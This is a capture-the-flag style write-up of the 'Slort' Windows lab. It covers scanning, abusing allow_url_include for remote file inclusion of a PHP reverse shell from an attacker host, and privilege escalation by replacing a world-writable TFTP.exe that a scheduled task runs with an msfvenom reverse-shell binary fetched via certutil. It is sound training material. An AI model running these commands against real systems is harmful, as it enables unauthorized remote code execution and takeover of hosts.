---
title: "Slort - Writeup"
linkTitle: "Slort"
weight: 12
featured: true
platform: "PG"
name: "Slort"
os: "Windows"
difficulty: "Medium"
release: "06 Jul 2026"
ip: "192.168.109.53"
# Drop a real avatar at static/img/pg/slort.png and uncomment:
# avatar: "/img/pg/slort.png"
tags: ["windows", "xampp", "lfi-rfi", "php-reverse-shell", "scheduled-task", "writable-binary", "msfvenom"]
description: "Medium Windows box. A XAMPP install with allow_url_include enabled gives RFI-based RCE, and a scheduled task that trusts a writable TFTP.exe finishes the job with Administrator."
---

{{< htb name="Slort" os="Windows" difficulty="Medium" release="06 Jul 2026" ip="192.168.109.53" platform="PG" >}}

## Reconnaissance

```
(root㉿kali)# rustscan -a 192.168.109.53
```

```
Open 192.168.109.53:21
Open 192.168.109.53:135
Open 192.168.109.53:139
Open 192.168.109.53:445
Open 192.168.109.53:3306
Open 192.168.109.53:4443
Open 192.168.109.53:5040
Open 192.168.109.53:7680
Open 192.168.109.53:8080
```

```
(root㉿kali)# nmap 192.168.109.53 -p21,445,3306,4443,5040,7680,8080 -sCV
```

```
21/tcp   open  ftp           FileZilla ftpd 0.9.41 beta
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MariaDB 10.3.24 or later (unauthorized)
4443/tcp open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-title: Welcome to XAMPP
8080/tcp open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-title: Welcome to XAMPP
Service Info: OS: Windows
```

Two identical XAMPP instances on 4443 and 8080, that's the surface worth digging into.

## Enumeration

```
(root㉿kali)# ffuf -u "http://192.168.109.53:4443/dashboard/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -c -e .php,.html
```

```
docs           [Status: 301]
index.html     [Status: 200]
phpinfo.php    [Status: 200]
```

The default XAMPP dashboard is fully exposed.

![XAMPP welcome dashboard](/img/pg/slort/01-xampp-dashboard.png)

`phpinfo.php` leaks the PHP configuration directly, and two settings stand out immediately.

![phpinfo.php output showing PHP 7.4.6 configuration](/img/pg/slort/02-phpinfo.png)

```
allow_url_fopen    On
allow_url_include  On
```

Both On means any code that includes a page based on user input can be pointed at a remote file, classic RFI territory.

```
(root㉿kali)# ffuf -u "http://192.168.109.53:4443/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -c -e .php,.html
```

```
site         [Status: 301]
dashboard    [Status: 301]
phpmyadmin   [Status: 403]
xampp        [Status: 301]
```

`/site` hosts a real application, branded **SLORT**, using a `page` parameter to load content.

![SLORT site showing the page parameter in the URL](/img/pg/slort/03-slort-site-page-param.png)

```
http://192.168.109.53:4443/site/index.php?page=contact.php
```

## Initial Foothold

With `allow_url_include` enabled, that `page` parameter will fetch and execute PHP from anywhere, including a URL. Host a PHP reverse shell and point the parameter straight at it.

```
(root㉿kali)# python -m http.server 8080
(root㉿kali)# curl "http://192.168.109.53:4443/site/index.php?page=http://192.168.45.170:8080/rev_shell.php"
```

```
(root㉿kali)# rlwrap nc -lnvp 22
```

```
connect to [192.168.45.170] from (UNKNOWN) [192.168.109.53] 50275
SOCKET: Shell has connected! PID: 1004
Microsoft Windows [Version 10.0.19042.1387]
```

```
C:\xampp\htdocs\site>type C:\Users\rupert\Desktop\local.txt
```

```
586d12e6a1b933a3af2030bd95740a9a
```

## Privilege Escalation

```
C:\Users\rupert\Desktop>whoami /all
```

```
User Name    SID
============ ==============================================
slort\rupert S-1-5-21-2032240294-1210393520-1520670448-1002

Mandatory Label\Medium Mandatory Level
```

Medium integrity, no obviously abusable privilege in the list. Look around the filesystem instead.

```
C:\Backup>dir
```

```
06/12/2020  07:45 AM            11,304 backup.txt
06/23/2020  07:49 PM            73,802 FTP.exe
07/06/2026  08:15 AM                57 info.txt
07/06/2026  09:21 AM             7,680 TFTP.exe
```

```
C:\Backup>type info.txt
```

```
"C:\Backup\TFTP.EXE -i 192.168.45.170  get backup.txt"
```

Something on this box runs that exact command on a schedule, pulling a file via `TFTP.exe`. Check what that binary allows.

```
C:\Backup>icacls TFTP.EXE
```

```
TFTP.EXE BUILTIN\Users:(I)(F)
         BUILTIN\Administrators:(I)(F)
         NT AUTHORITY\SYSTEM:(I)(F)
```

`(F)` for `BUILTIN\Users` means full control, this file can be overwritten outright. Whatever scheduled process runs `info.txt`'s command will execute whatever `TFTP.exe` actually is at that moment, not necessarily the real TFTP client.

```
(root㉿kali)# msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.170 LPORT=1338 -f exe -o rev.exe
(root㉿kali)# python -m http.server 80
```

```
C:\Backup>move TFTP.exe FTP.exe
C:\Backup>certutil -urlcache -split -f http://192.168.45.170/rev.exe C:\Backup\TFTP.exe
```

The scheduled command now launches the payload instead of the real client. Catch it.

```
(root㉿kali)# nc -lnvp 1338
```

```
connect to [192.168.45.170] from (UNKNOWN) [192.168.109.53] 50842
Microsoft Windows [Version 10.0.19042.1387]
```

```
C:\WINDOWS\system32> type C:\Users\Administrator\Desktop\proof.txt
```

```
cefdf9a365a7a326e3a97a8dff830042
```

## Lessons learned

- Read `phpinfo.php` for more than just the version number. `allow_url_include` being On is the single setting that turns a generic `page=` parameter into a full RFI, it's worth scanning for by name every time this file is exposed.
- A file left in a world-writable state next to a command referencing it is a direct hint, not a coincidence. `info.txt` describing the exact command combined with `icacls` showing full write access on that same binary is the whole vulnerability laid out in plain text.
- Overwriting a trusted binary that something else invokes on a schedule is often more reliable than chasing a token-impersonation or kernel exploit. Check file permissions on anything a scheduled task or service touches before looking for something more exotic.
